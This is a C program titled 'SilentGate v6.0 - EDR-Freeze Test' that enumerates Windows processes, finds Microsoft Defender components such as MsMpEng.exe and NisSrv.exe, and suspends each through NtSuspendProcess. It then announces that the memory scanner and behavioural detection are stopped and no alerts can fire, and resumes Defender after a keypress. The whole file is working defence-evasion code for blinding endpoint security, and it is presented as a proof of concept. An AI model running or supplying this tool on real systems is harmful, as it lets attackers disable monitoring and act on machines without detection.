/*
 * SilentGate v6.0 - EDR-Freeze Test
 * Author: JarDani
 * Suspends all Defender processes via NtSuspendProcess
 * Proves EDR-Freeze works from user mode
 */
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtSuspendProcess)(HANDLE);
typedef NTSTATUS (NTAPI *pNtResumeProcess)(HANDLE);

const char* TARGETS[] = {
    "MsMpEng.exe",
    "MpDefenderCoreService.exe",
    "NisSrv.exe",
    "MpCmdRun.exe",
    NULL
};

int main() {
    printf("[EDR-FREEZE] SilentGate v6.0\n");
    printf("[EDR-FREEZE] Author: JarDani\n\n");

    /* Get NtSuspendProcess + NtResumeProcess */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtSuspendProcess NtSuspendProcess =
        (pNtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
    pNtResumeProcess NtResumeProcess =
        (pNtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");

    if (!NtSuspendProcess || !NtResumeProcess) {
        printf("[ERROR] Could not find NtSuspendProcess\n");
        return 1;
    }
    printf("[EDR-FREEZE] NtSuspendProcess found at: %p\n", NtSuspendProcess);
    printf("[EDR-FREEZE] Scanning for Defender processes...\n\n");

    /* Snapshot all processes */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    DWORD frozen_pids[16] = {0};
    int   frozen_count    = 0;
    char  frozen_names[16][64];

    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; TARGETS[i]; i++) {
                if (_stricmp(pe.szExeFile, TARGETS[i]) == 0) {
                    HANDLE h = OpenProcess(
                        PROCESS_SUSPEND_RESUME | PROCESS_QUERY_INFORMATION,
                        FALSE, pe.th32ProcessID);

                    if (h) {
                        NTSTATUS s = NtSuspendProcess(h);
                        if (s == 0) {
                            printf("[FROZEN] %-30s PID=%lu\n",
                                pe.szExeFile, pe.th32ProcessID);
                            frozen_pids[frozen_count] = pe.th32ProcessID;
                            strncpy(frozen_names[frozen_count],
                                pe.szExeFile, 63);
                            frozen_count++;
                        } else {
                            printf("[FAILED] %-30s PID=%lu status=0x%X\n",
                                pe.szExeFile, pe.th32ProcessID, s);
                        }
                        CloseHandle(h);
                    } else {
                        printf("[DENIED] %-30s PID=%lu\n",
                            pe.szExeFile, pe.th32ProcessID);
                    }
                }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    printf("\n[EDR-FREEZE] Frozen: %d processes\n", frozen_count);

    if (frozen_count > 0) {
        printf("[EDR-FREEZE] Defender is COMATOSE\n");
        printf("[EDR-FREEZE] Memory scanner STOPPED\n");
        printf("[EDR-FREEZE] Behavioral ML STOPPED\n");
        printf("[EDR-FREEZE] No alerts can fire\n");
        printf("\n[EDR-FREEZE] Press ENTER to resume Defender...\n");
        getchar();

        /* Resume all frozen processes */
        for (int i = 0; i < frozen_count; i++) {
            HANDLE h = OpenProcess(PROCESS_SUSPEND_RESUME,
                FALSE, frozen_pids[i]);
            if (h) {
                NtResumeProcess(h);
                printf("[RESUMED] %s PID=%lu\n",
                    frozen_names[i], frozen_pids[i]);
                CloseHandle(h);
            }
        }
        printf("[EDR-FREEZE] Defender restored\n");
    }

    printf("\n[EDR-FREEZE] Complete\n");
    getchar();
    return 0;
}
